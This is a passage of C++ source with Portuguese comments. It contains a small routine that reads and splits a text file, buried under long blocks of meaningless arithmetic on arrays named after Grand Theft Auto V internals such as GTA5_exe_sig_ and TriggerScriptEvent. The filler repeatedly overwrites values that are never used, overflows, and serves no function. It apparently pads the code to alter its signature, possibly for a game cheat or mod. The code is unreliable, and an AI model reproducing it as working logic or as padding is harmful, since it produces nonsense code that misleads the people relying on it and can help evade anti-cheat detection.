					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				std::vector<string> TempVECTOR;
				vector<string> tokens;
				ifstream imput(TXTFilePath);
				for (string line; getline(imput, line);)
				{
					istringstream tokenizer{ line };
					string token;
					while (getline(tokenizer, token, separador))
					{
						tokens.push_back(token);
					}
				}
				return tokens;
				/*
				* Exemplo de 2 valores::
				for (int i = 0; i <= Extern_Reader::Simple_TXT_file::GetVectorSize(Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")); i++)
				{
					cout << "AddOption(" << Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")[i] << "," << Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")[i + 1] << ");" << endl;
					i++;
				}

				Exemplo de 2 valores, separados por virgula:
				Extern_Reader::Simple_TXT_file::TXTFilePath = ".\\T.txt";
				std::vector<string> A = Extern_Reader::Simple_TXT_file::String::Get_More_Values(',');
				for (int i = 0; i <= Extern_Reader::Simple_TXT_file::GetVectorSize(A); i++)
				{
					cout << "AddOption(" << A[i] << "," << A[i + 1] << ");" << endl;
					i++;
				}

				* Exemplo de 3 valores::
				for (int i = 0; i <= Extern_Reader::Simple_TXT_file::GetVectorSize(Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")); i++)
				{
					if (i <= (Extern_Reader::Simple_TXT_file::GetVectorSize(Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")) + 3))
					{
						cout << "AddOption(" << Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")[i] << ", " << Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")[i + 1] << ", " << Extern_Reader::Simple_TXT_file::String::Get_More_Values("Teste.txt")[i + 2] << ");" << endl;
						i++;
						i++;
					}
				}
				*/
			}
		}
		namespace Int
		{
			int PED_TO_NET_ = 2;
			int NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			int offset = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_exe_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			double a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_exe_sig_ss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  GTA5_sig_ss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyssd[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			float a = 0.0f;
			float b = 0.0f;
			int  GTA5_exe_sig_Zero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int GTA5_sig_2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_sig_3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int offsetw = (PED_TO_NET_ * 0xA) + 0xBB;
			int  GTA5_sig_10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_ss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  arrassyss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  Eduardo[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int GTA5_exe_sig_Dois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			double sa1w = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			int  GTA5_sig_2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  GTA5_sig_3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };

			int ponteiro = 2;
			int aaaaaa = ponteiro * 2;
			int  matriz[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco1[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  enderecoss4d[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  matrizZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco2s[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int endereco3dd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco10[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  enderecoss4[] = { 0x04, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int matrizDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco2sw[] = { 0x02, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  endereco3ddd[] = { 0x03, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEvent[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int  TriggerScriptEventss[] = { 0x64, 0x6f, 0x74, 0x63, 0x65, 0x74 };
			int  TriggerScriptEventZero[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			int TriggerScriptEventDois[] = { 0x01, 0xAA, 0xB1, 0xDC, 0x10, 0xDD, 0xAA, 0xB1, 0xDC, 0x10, 0xDD };
			std::vector<int> GetValues()
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
